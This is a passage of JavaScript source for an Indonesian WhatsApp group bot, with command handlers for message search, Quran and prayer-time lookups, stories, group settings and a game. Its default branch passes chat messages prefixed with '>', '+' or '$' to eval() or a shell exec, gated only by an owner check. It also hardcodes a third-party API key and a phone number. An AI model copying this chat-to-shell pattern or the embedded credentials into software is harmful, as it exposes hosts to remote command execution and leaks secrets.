				if (args[0].startsWith('08')) return reply('Awali nomor dengan 62')
				if (args[0].startsWith('+62')) return reply('Awali nomor dengan 62')
				var pc = body.slice(6)
				var nomor = pc.split("|")[0];
				var org = pc.split("|")[1];
				varo.sendMessage(nomor+'@s.whatsapp.net', `*| ADA PESAN |*\n\nPesan : ${org}\nFrom : @${sender.split('@')[0]}`, MessageType.text, {contextInfo:{mentionedJid:[sender]}})   
				varo.sendMessage(from,`Sukses mengirim\nChat : ${org}\nKe : @${nomor}`, text, {contextInfo:{mentionedJid:[`${nomor}@s.whatsapp.net`]},quoted:mek})
				break
		case 'searchmsg':
		case 'caripesan':
			if (!isPremium) return reply(`Command ini hanya untuk member premium\n\nMau join member premium? ketik *${prefix}sewabot* untuk informasi lebih lanjut`)
			if (args.length < 1)
				return reply(
					`Command untuk mencari pesan digrup ini\n\nExample : ${prefix + command} halo|10`
					)
			teks = arg
			if (teks.includes(
					"|")) {
				try {
					var ve =
						teks
						.split(
							"|"
							)[0]
					var za =
						teks
						.split(
							"|"
							)[1]
					sampai =
						`${za}`
					if (isNaN(
							sampai
							))
						return reply(
							'Harus berupa Angka!'
							)
					batas =
						parseInt(
							sampai
							) +
						1
					if (batas >
						30)
						return reply(
							'Maks 30!'
							)
					reply(mess
						.wait
						)
					cok =
						await varo
						.searchMessages(
							`${ve}`,
							from,
							batas,
							1)
					if (cok
						.messages
						.length <
						2)
						return reply(
							'Tidak Ditemukan Pesan'
							)
					if (cok
						.messages
						.length <
						parseInt(
							batas
							))
						reply(
							`Hanya Ditemukan ${cok.messages.length - 1} Pesan`
							)
					for (i =
						1; i <
						cok
						.messages
						.length; i++
						) {
						if (cok
							.messages[
								i
								]
							.message
							) {
							varo
								.sendMessage(
									from,
									`Ditemukan!`,
									text, {
										sendEphemeral: true,
										quoted: cok
											.messages[
												i
												]
									}
									)
						}
					}
				} catch (e) {
					return reply(
						String(
							e
							)
						)
				}
			} else {
				reply(
					`Command untuk mencari pesan digrup ini\n\nExample : ${prefix + command} halo|10`)
			}
			break
		/*case 'lolkey':
		case 'cekapikey':
			if (args.length < 1)
				return reply(
					`Ketik ${prefix}lolkey [Apikeynya]`
					)
			anu =
				await fetchJson(
					`http://api.lolhuman.xyz/api/checkapikey?apikey=${q}`
					)
			teks =
				`*YOUR APIKEY*\n\n▷ Ussername= ${anu.result.username}\n▷ Request= ${anu.result.requests}\n▷ Today= ${anu.result.today}\n▷ Akun Type= ${anu.result.account_type}\n▷ Expired= ${anu.result.expired}\n▷ API = http://api.lolhuman.xyz`
			varo.sendMessage(
				from, teks,
				text, {
					quoted: troli
				})
			break*/
		case 'bugreport':
			case 'report':
			if (args.length < 1)
				return reply(
					`Command untuk memberikan laporan ke owner jika terdapat bug pada bot ini\n\nExample : ${prefix+command} fitur sticker rusak`
					)
			teks = args.join(
				' ')
			reply(
				'Laporan berhasil terkirim!')
			varo.sendMessage(
				'6289516998339@s.whatsapp.net',
				`*| BUG REPORT |*\n\nFrom : @${sender.split('@')[0]}\nMess : ${teks}`,
				text,{contextInfo:{mentionedJid:[sender]},quoted:mek})
			break
		case 'readall':
			if (!isOwner) return reply(mess.only.owner)
			totalchat.map(
			async ({
					jid
				}) => {
					await varo
						.chatRead(
							jid
							)
				})
			reply(
				`\`\`\`Berhasil membaca ${unread.length} Chat !\`\`\``)
			console.log(
				totalchat
				.length)
			break
			break

			//-------------------< islam menu >--------------------

		case 'kisahnabi':
			if (args.length ==
				0) return reply(
					`Command untuk mencari kisah Nabi\n\nExample : ${prefix+command} Muhammad`
				)
			query = args.join(
				" ")
			get_result =
				await fetchJson(
					`http://api.lolhuman.xyz/api/kisahnabi/${query}?apikey=vxro2k21`
					)
			get_result =
				get_result
				.result
			ini_txt =
				`Name : ${get_result.name}\n`
			ini_txt +=
				`Lahir : ${get_result.thn_kelahiran}\n`
			ini_txt +=
				`Umur : ${get_result.age}\n`
			ini_txt +=
				`Tempat : ${get_result.place}\n`
			ini_txt +=
				`Story : \n${get_result.story}`
			reply(ini_txt)
			break
		case 'jadwalsholat':
		case 'jadwalshalat':
			if (args.length ==
				0) return reply(
					`Command untuk mencari jadwal shalat\n\nExample : ${prefix+command} Jakarta`
				)
			daerah = args.join(
				" ")
			get_result =
				await fetchJson(
					`http://api.lolhuman.xyz/api/sholat/${daerah}?apikey=vxro2k21`
					)
			get_result =
				get_result
				.result
			ini_txt =
				`Wilayah : ${get_result.wilayah}\n`
			ini_txt +=
				`Tanggal : ${get_result.tanggal}\n`
			ini_txt +=
				`Sahur : ${get_result.sahur}\n`
			ini_txt +=
				`Imsak : ${get_result.imsak}\n`
			ini_txt +=
				`Subuh : ${get_result.subuh}\n`
			ini_txt +=
				`Terbit : ${get_result.terbit}\n`
			ini_txt +=
				`Dhuha : ${get_result.dhuha}\n`
			ini_txt +=
				`Dzuhur : ${get_result.dzuhur}\n`
			ini_txt +=
				`Ashar : ${get_result.ashar}\n`
			ini_txt +=
				`Maghrib : ${get_result.imsak}\n`
			ini_txt +=
				`Isya : ${get_result.isya}`
			reply(ini_txt)
			break
		case 'listsurah':
			get_result =
				await fetchJson(
					`https://api.lolhuman.xyz/api/quran?apikey=vxro2k21`
					)
			get_result =
				get_result
				.result
			ini_txt =
				'List Surah:\n'
			for (var x in
					get_result) {
				ini_txt +=
					`${x}. ${get_result[x]}\n`
			}
			reply(ini_txt)
			break
		case 'alquran':
			if (args.length < 1)
				return reply(
					`Example: ${prefix + command} 18 or ${prefix + command} 18/10 or ${prefix + command} 18/1-10`
					)
			urls =
				`http://api.lolhuman.xyz/api/quran/${args[0]}?apikey=vxro2k21`
			quran =
				await fetchJson(
					urls)
			result = quran
				.result
			ayat = result.ayat
			ini_txt =
				`QS. ${result.surah} : 1-${ayat.length}\n\n`
			for (var x of
				ayat) {
				arab = x.arab
				nomor = x.ayat
				latin = x.latin
				indo = x
					.indonesia
				ini_txt +=
					`${arab}\n${nomor}. ${latin}\n${indo}\n\n`
			}
			ini_txt = ini_txt
				.replace(/<u>/g,
					"").replace(
					/<\/u>/g, ""
					)
			ini_txt = ini_txt
				.replace(
					/<strong>/g,
					"").replace(
					/<\/strong>/g,
					"")
			ini_txt = ini_txt
				.replace(/<u>/g,
					"").replace(
					/<\/u>/g, ""
					)
			reply(ini_txt)
			break
		case 'asmaulhusna':
			get_result =
				await fetchJson(
					`http://api.lolhuman.xyz/api/asmaulhusna?apikey=vxro2k21`
					)
			get_result =
				get_result
				.result
			ini_txt =
				`No : ${get_result.index}\n`
			ini_txt +=
				`Latin: ${get_result.latin}\n`
			ini_txt +=
				`Arab : ${get_result.ar}\n`
			ini_txt +=
				`Indonesia : ${get_result.id}\n`
			ini_txt +=
				`English : ${get_result.en}`
			reply(ini_txt)
			break
		case 'alquranaudio':
			if (args.length ==
				0) return reply(
				`Example: ${prefix + command} 18 or ${prefix + command} 18/10`
				)
			surah = args[0]
			ini_buffer =
				await getBuffer(
					`http://api.lolhuman.xyz/api/quran/audio/${surah}?apikey=vxro2k21`
					)
			varo.sendMessage(
				from,
				ini_buffer,
				audio, {
					quoted: mek,
					mimetype: Mimetype
						.mp4Audio
				})
			break
			//------------------< serti menu >-------------------   
		/*case 'sertitolol':
			if (args.length < 1)
				return reply(
					`Textnya Mana Cuy?\n*Contoh ${prefix}tololserti chi BOT`
					)
			ct = body.slice(12)
			zhain =
				await getBuffer(
					`https://api.lolhuman.xyz/api/toloserti?apikey=vxro2k21&name=${ct}`
					)
			varo.sendMessage(
				from, zhain,
				image, {
					quoted: mek,
					caption: 'Nih Dah Jadi'
				})
			break*/
			//------------------< cerita menu >-------------------
		case 'cerpen':
			if (isBanned) return reply(mess.baned)
			if (isLimit(sender,
				isPremium,
				isOwner,
				limitCount,
				limit))
			return reply(
				mess
				.limit)
			if (!isGroup && !isPremium && !isOwner) return sendButLocation(from, 'Bot ini hanya untuk group, mau menggunakan bot secara private? Ayo join member premium vxrobot', `VXROBOT©2022`, {jpegThumbnail:dfrply},[{buttonId:`${prefix}sewabot`,buttonText:{displayText:'JOIN'},type:1}],{contextInfo: { mentionedJid: [sender]}})
			get_result =
				await fetchJson(
					`http://api.lolhuman.xyz/api/cerpen?apikey=vxro2k21`
					)
			get_result =
				get_result
				.result
			ini_txt =
				`Title : ${get_result.title}\n`
			ini_txt +=
				`Creator : ${get_result.creator}\n`
			ini_txt +=
				`Story :\n${get_result.cerpen}`
			reply(ini_txt)
			limitAdd(sender,
				limit)
			break
		case 'ceritahoror':
			if (isBanned) return reply(mess.baned)
			if (isLimit(sender,
				isPremium,
				isOwner,
				limitCount,
				limit))
			return reply(
				mess
				.limit)
			if (!isGroup && !isPremium && !isOwner) return sendButLocation(from, 'Bot ini hanya untuk group, mau menggunakan bot secara private? Ayo join member premium vxrobot', `VXROBOT©2022`, {jpegThumbnail:dfrply},[{buttonId:`${prefix}sewabot`,buttonText:{displayText:'JOIN'},type:1}],{contextInfo: { mentionedJid: [sender]}})
			get_result =
				await fetchJson(
					`http://api.lolhuman.xyz/api/ceritahoror?apikey=vxro2k21`
					)
			get_result =
				get_result
				.result
			ini_txt =
				`Title : ${get_result.title}\n`
			ini_txt +=
				`Desc : ${get_result.desc}\n`
			ini_txt +=
				`Story :\n${get_result.story}\n`
			thumbnail =
				await getBuffer(
					get_result
					.thumbnail)
			varo.sendMessage(
				from,
				thumbnail,
				image, {
					quoted: mek,
					caption: ini_txt
				})
				limitAdd(sender,
					limit)
			break
			//------------------(KATA KATA MENU)---------+--------

		case 'quotesdilan':
			if (isBanned) return reply(mess.baned)
			if (!isGroup && !isPremium && !isOwner) return sendButLocation(from, 'Bot ini hanya untuk group, mau menggunakan bot secara private? Ayo join member premium vxrobot', `VXROBOT©2022`, {jpegThumbnail:dfrply},[{buttonId:`${prefix}sewabot`,buttonText:{displayText:'JOIN'},type:1}],{contextInfo: { mentionedJid: [sender]}})
			quotedilan =
				await fetchJson(
					`https://api.lolhuman.xyz/api/quotes/dilan?apikey=vxro2k21`
					)
			yah = quotedilan
				.result
			button = [
				{
					buttonId: `y`,
					buttonText: {
						displayText: '️❌ 𝑺𝒕𝒐𝒑'
					},
					type: 1
				},
				{
					buttonId: `${prefix+command}`,
					buttonText: {
						displayText: '️➡️ 𝑵𝒆𝒙𝒕'
					},
					type: 1
				}, ]
			buttons = {
				contentText: `${yah}`,
				footerText: `${fake}`,
				buttons: button,
				headerType: 1
			}
			await varo
				.sendMessage(
					from,
					buttons,
					MessageType
					.buttonsMessage, {
						quoted: mek
					})

			break;

		case 'faktaunik':
		case 'katabijak':
		case 'pantun':
		case 'bucin':
			if (isBanned) return reply(mess.baned)
			if (!isGroup && !isPremium && !isOwner) return sendButLocation(from, 'Bot ini hanya untuk group, mau menggunakan bot secara private? Ayo join member premium vxrobot', `VXROBOT©2022`, {jpegThumbnail:dfrply},[{buttonId:`${prefix}sewabot`,buttonText:{displayText:'JOIN'},type:1}],{contextInfo: { mentionedJid: [sender]}})
			get_result =
				await fetchJson(
					`https://api.lolhuman.xyz/api/random/${command}?apikey=vxro2k21`
					)
			gege = get_result
				.result
			button = [
				{
					buttonId: `y`,
					buttonText: {
						displayText: '️❌ 𝑺𝒕𝒐𝒑'
					},
					type: 1
				},
				{
					buttonId: `${prefix+command}`,
					buttonText: {
						displayText: '️➡️ 𝑵𝒆𝒙𝒕'
					},
					type: 1
				}, ]
			buttons = {
				contentText: `${gege}`,
				footerText: `${fake}`,
				buttons: button,
				headerType: 1
			}
			await varo
				.sendMessage(
					from,
					buttons,
					MessageType
					.buttonsMessage, {
						quoted: mek
					})

			break;
			break
			//------------------< Maker Menu >--------------------   


			//------------------< enable/disable>-------------------
		case 'leveling':
			if (!isGroup)
			return reply(
					mess
					.only
					.group)
			if (!isGroupAdmins) return reply(mess.only.admin)
			if (ar[0] ===
				'enable') {
				if (
					isLevelingOn)
					return reply(
						'Fitur leveling telah diaktifkan sebelumnya.'
						)
				_leveling.push(
					from)
				fs.writeFileSync(
					'./database/group/leveling.json',
					JSON
					.stringify(
						_leveling
						))
				reply(
					'Fitur leveling berhasil diaktifkan.')
			} else if (ar[0] ===
				'disable') {
				var anup =
					_leveling
					.indexOf(
						from)
				_leveling
					.splice(
						anup, 1)
				fs.writeFileSync(
					'./database/group/leveling.json',
					JSON
					.stringify(
						_leveling
						))
				reply(
					'Fitur leveling berhasil dimatikan.')
			} else {
				reply(
					'Pilih enable atau disable!')
			}
			break
		case 'antilink':
			if (!isGroupAdmins)
				return reply(
					mess
					.only
					.admin)
			if (!isGroup)
			return reply(
					mess
					.only
					.group)
			if (!
				isBotGroupAdmins
				) return reply(
				`Bot Harus jadi Admin`
				)
			if (!q) return reply(
				`Pilih enable atau disable`
				)
			if (args[0]
				.toLowerCase() ===
				'enable') {
				if (isAntiLink)
					return reply(
						`Udah aktif`
						)
				antilink.push(
					from)
				fs.writeFileSync(
					'./database/group/antilink.json',
					JSON
					.stringify(
						antilink
						))
				reply(
					'ANTILINK ACTIVED')
			} else if (args[0]
				.toLowerCase() ===
				'disable') {
				let anu =
					antilink
					.indexOf(
						from)
				antilink.splice(
					anu, 1)
				fs.writeFileSync(
					'./database/group/antilink.json',
					JSON
					.stringify(
						antilink
						))
				reply(
					'ANTILINK NON-ACTIVE')
			} else {
				reply(
					`Pilih enable atau disable`)
			}
			break
		/*case 'welcome':
			if (!isGroupAdmins)
				return reply(
					mess
					.only
					.admin)
			if (!isGroup)
			return reply(
					mess
					.only
					.group)
			if (args.length < 1)
				return reply(
					'!welcome enable/disable'
					)
			if ((args[0]) ===
				'enable') {
				if (isWelkom)
					return reply(
						'Udah aktif'
						)
				welkom.push(
					from)
				fs.writeFileSync(
					'./database/group/welcome.json',
					JSON
					.stringify(
						welkom
						))
				reply(
					'Sukses mengaktifkan fitur welcome di group ini ✔️')
			} else if ((args[
				0]) ===
				'disable') {
				welkom.splice(
					from, 1)
				fs.writeFileSync(
					'./database/group/welcome.json',
					JSON
					.stringify(
						welkom
						))
				reply(
					'Sukses menonaktifkan fitur welcome di group ini ✔️')
			} else {
				reply(
					'Enable untuk mengaktifkan, disable untuk menonaktifkan')
			}
			break*/
		case 'mute':
			if (!isGroup)
			return reply(
					mess
					.only
					.group)
					if (!isPremium) return reply(`Command ini hanya untuk member premium\n\nMau join member premium? ketik *${prefix}sewabot* untuk informasi lebih lanjut`)
			if (args.length < 1)
				return reply(
					`${prefix}mute enable/disable`
					)
			if (args[0]
				.toLowerCase() ===
				'enable') {
				if (isMuted)
					return reply(
						`udah di mute`
						)
				mute.push(from)
				fs.writeFileSync(
					'./database/group/mute.json',
					JSON
					.stringify(
						mute
						))
				reply(
					`MUTE ACTIVED`)
			} else if (args[0]
				.toLowerCase() ===
				'disable') {
				anu = mute
					.indexOf(
						from)
				mute.splice(anu,
					1)
				fs.writeFileSync(
					'./database/group/mute.json',
					JSON
					.stringify(
						mute
						))
				reply(
					`MUTE NON-ACTIVE`)
			} else {
				reply(
					`Pilih enable atau disable`)
			}
			break
		case 'grupsetting':
		case 'groupsetting':
			if (!isGroup)
			return reply(
					mess
					.only
					.group)
			if (!isGroupAdmins)
				return reply(
					mess
					.only
					.admin)
			list = []
			com = [`group buka`,
			    `nsfw enable`,
				`leveling enable`,
				`antilink enable`,
				`antiviewonce enable`,
				`mute enable`
			]
			comm = [`group tutup`,
			    `nsfw disable`,
				`leveling disable`,
				`antilink disable`,
				`antiviewonce disable`,
				`mute disable`
			]
			listnya = [
				`Group open/close`,
				`NSFW enable/disable`,
				`Leveling enable/disable`,
				`Antilink enable/disable`,
				`AntiViewOnce enable/disable`,
				`Mute enable/disable`
			]
			suruh = [`Enable`,
				`Disable`
			]
			fiturname = [
				`Group`,
				`Nsfw`,
				`Leveling`,
				`AntiLink`,
				`AntiViewOnce`,
				`Mute`
			]
			startnum = 0;
			let startnu = 0;
			let startn = 0;
			let start = 0
			startnumm = 1
			for (let x of com) {
				var yy = {
					title: `${listnya[startnum++]}`,
					rows: [
					{
						title: `${suruh[0]}`,
						description: `\nMengaktifkan ${fiturname[startnu++]}`,
						rowId: `${prefix}${x}`
					},
					{
						title: `${suruh[1]}`,
						description: `\nMenonaktifkan ${fiturname[startn++]}`,
						rowId: `${prefix}${comm[start++]}`
					}]
				}
				list.push(yy)
			}
			listmsg(from,
				`*| GROUP SETTING |*`,
				`\n*<+> Name :* ${groupName}\n*<+> ID :* ${from}\n\nAntiLink : *${isAntiLink?'Nyala':'Mati'}*\nAntiViewOnce : *${isAntiViewOnce?'Nyala':'Mati'}*\nNSFW : *${isNsfw?'Nyala':'Mati'}*\nLeveling : *${isLevelingOn?'Nyala':'Mati'}*`,
				list)

			break
		case 'group':
			if (!isGroup)
			return reply(ind
					.groupo()
					)
			if (!isGroupAdmins)
				return reply(ind
					.admin()
					)
			if (!
				isBotGroupAdmins
				) return reply(
				ind
				.badmin()
				)
			if (args[0] ===
				'buka') {
				reply(
					`*BERHASIL MEMBUKA GROUP*`)
				varo
					.groupSettingChange(
						from,
						GroupSettingChange
						.messageSend,
						false)
			} else if (args[
				0] === 'tutup'
				) {
				reply(
					`*BERHASIL MENUTUP GROUP*`)
				varo
					.groupSettingChange(
						from,
						GroupSettingChange
						.messageSend,
						true)
			}
			break
			//------------------< Menunya Bang:v >-------------------

		/*case 'ownermenu':
			varo.sendMessage(
				from,
				ownerMenu(
					prefix),
				MessageType
				.text, {
					quoted: troli
				})
			break
		case 'downloadmenu':
			varo.sendMessage(
				from,
				downloadMenu(
					prefix),
				MessageType
				.text, {
					quoted: troli
				})
			break
		case 'gamemenu':
			varo.sendMessage(
				from,
				gameMenu(
					prefix),
				MessageType
				.text, {
					quoted: troli
				})
			break
		case 'rules':
			varo.sendMessage(
				from,
				rulesBot(
					prefix),
				MessageType
				.text, {
					quoted: troli
				})
			break*/
		case 'owner':
			varo.sendMessage(
				from, owner(
					prefix),
				MessageType
				.text, {
					quoted: troli
				})
			break
		/*case 'wibumenu':
			varo.sendMessage(
				from,
				wibuMenu(
					prefix),
				MessageType
				.text, {
					quoted: troli
				})
			break
		case 'infomenu':
			varo.sendMessage(
				from,
				infoMenu(
					prefix),
				MessageType
				.text, {
					quoted: troli
				})
			break
		case 'stickermenu':
			varo.sendMessage(
				from,
				stickerMenu(
					prefix),
				MessageType
				.text, {
					quoted: troli
				})
			break
		case 'islammenu':
			varo.sendMessage(
				from,
				islamMenu(
					prefix),
				MessageType
				.text, {
					quoted: troli
				})
			break
		case 'sertimenu':
			varo.sendMessage(
				from,
				sertiMenu(
					prefix),
				MessageType
				.text, {
					quoted: troli
				})
			break
		case 'ceritamenu':
			varo.sendMessage(
				from,
				ceritaMenu(
					prefix),
				MessageType
				.text, {
					quoted: troli
				})
			break
		case 'makermenu':
			varo.sendMessage(
				from,
				makerMenu(
					prefix),
				MessageType
				.text, {
					quoted: troli
				})
			break
		case 'toolsmenu':
			varo.sendMessage(
				from,
				toolsMenu(
					prefix),
				MessageType
				.text, {
					quoted: troli
				})
			break
		case 'dewasamenu':
			varo.sendMessage(
				from,
				dewasaMenu(
					prefix),
				MessageType
				.text, {
					quoted: troli
				})
			break
		case 'othermenu':
			varo.sendMessage(
				from,
				otherMenu(
					prefix),
				MessageType
				.text, {
					quoted: troli
				})
			break
		case 'groupmenu':
		case 'grupmenu':
			varo.sendMessage(
				from,
				groupMenu(
					prefix),
				MessageType
				.text, {
					quoted: troli
				})
			break
		case 'funmenu':
			varo.sendMessage(
				from,
				funMenu(
					prefix),
				MessageType
				.text, {
					quoted: troli
				})
			break*/

		default:
			if (fs.existsSync(
					`./VXROMD/${from}.json`
					)) {
				gelutSkuy =
					setGelud(
						`${from}`
						)
				if (sender ==
					`${gelutSkuy.Y}@s.whatsapp.net` &&
					budy
					.toLowerCase() ==
					'y') {
					if (gelutSkuy
						.status)
						return reply(
							`Game telah dimulai sebelumnya!`
							)
					gelutSkuy
						.status =
						true
					rand0m = [
						gelutSkuy
						.Z,
						gelutSkuy
						.Y
					]
					winR =
						rand0m[
							Math
							.floor(
								Math
								.random() *
								rand0m
								.length
								)
							]
					fs.writeFileSync(
						`./VXROMD/${from}.json`,
						JSON
						.stringify(
							gelutSkuy,
							null,
							2
							)
						)
					starGame = `👑 Gelud Game 🤙🏻 

Diantara @${gelutSkuy.Z} & @${gelutSkuy.Y}
▷ Pemenangnya adalah [ @${winR} ] `
					varo
						.sendMessage(
							from,
							starGame,
							text, {
								quoted: troli,
								contextInfo: {
									mentionedJid: [
										winR +
										"@s.whatsapp.net",
										gelutSkuy
										.Z +
										"@s.whatsapp.net",
										gelutSkuy
										.Y +
										"@s.whatsapp.net",
									]
								}
							})
					fs.unlinkSync(
						"./VXROMD/" +
						from +
						".json"
						);
				} else if (
					sender ==
					`${gelutSkuy.Y}@s.whatsapp.net` &&
					budy
					.toLowerCase() ==
					'n') {
					varo
						.sendMessage(
							from, `👑 Game Gelud Rejected 🤙🏻
▷ @${gelutSkuy.Y} Menolak🤙🏻`, text, {
								quoted: troli,
								contextInfo: {
									mentionedJid: [
										gelutSkuy
										.Y +
										"@s.whatsapp.net"
									]
								}
							})
					fs.unlinkSync(
						"./VXROMD/" +
						from +
						".json"
						);
				}
			}

			if (budy.startsWith(
					'>')) {
				if (!mek.key
					.fromMe && !
					isOwner)
					return
				try {
					return varo
						.sendMessage(
							from,
							JSON
							.stringify(
								eval(
									budy
									.slice(
										2
										)
									),
								null,
								'\t'
								),
							text, {
								quoted: mek
							})
				} catch (err) {
					e = String(
						err)
					reply(e)
				}
			}
			if (budy.startsWith(
					'$')) {
				if (!mek.key
					.fromMe && !
					isOwner)
					return
				qur = budy
					.slice(2)
				exec(qur, (err,
					stdout
					) => {
					if (
						err)
						return reply(
							`${fake} :~ ${err}`
							)
					if (
						stdout) {
						reply
							(
								stdout)
					}
				})
			}

			if (!isOwner && !mek
				.key.fromMe)
				return
			if (budy.startsWith(
					'+')) {
				try {
					console.log(
						color(
							'[ EVAL ]',
							'pink'
							),
						color(
							time
							),
						budy,
						color(
							'dari',
							'yellow'
							),
						pushname,
						color(
							'di'
							),
						isGroup ?
						groupName :
						'Private Chat'
						)
					reply(require(
							'util'
							)
						.format(
							eval(
								`;(async () => { ${budy.slice(2)} })()`
								)
							)
						)
				} catch (e) {
					console.log(
						e)
					err =
						String(
							e)
					js = JSON
						.stringify(
							e,
							null,
							2)
					if (js ==
						'{}')
						js = {
							err
						}
					js = JSON
						.stringify(
							js,
							null,
							2)
					js = '```' +
						js +
						'```'
					reply('_' +
						err +
						'_\n\n' +
						js)
				}
			}
			if (!isGroup &&
				isCmd && !mek
				.key.fromMe) {
				teks =
					`Maaf @${senderr.split('@')[0]}, command ${prefix + command} tidak ada dalam menu`
				varo
					.sendMessage(
						from, {
							text: teks,
							jpegThumbnail: fs
								.readFileSync(
									'./VXROMD/vxrobot.jpg'
									)
						},
						'extendedTextMessage', {
							sendEphemeral: true,
							quoted: mek,
							contextInfo: {
								forwardingScore: 508,
								isForwarded: true,
								mentionedJid: [
									senderr
								]
							}
						})
			}
		}
		if (isGroup && budy !=
			undefined) {} else {
			console.log('[',
				color(
					'TEXT',
					'teal'),
				']',
				`Message : ${budy} From`,
				color(
					pushname
					))
		}

	} catch (e) {
		e = String(e)
		if (!e.includes(
				"this.iszero"
				)) {
			console.log(
				'Message : %s',
				color(e,
					'green')
				)
		}
	}
}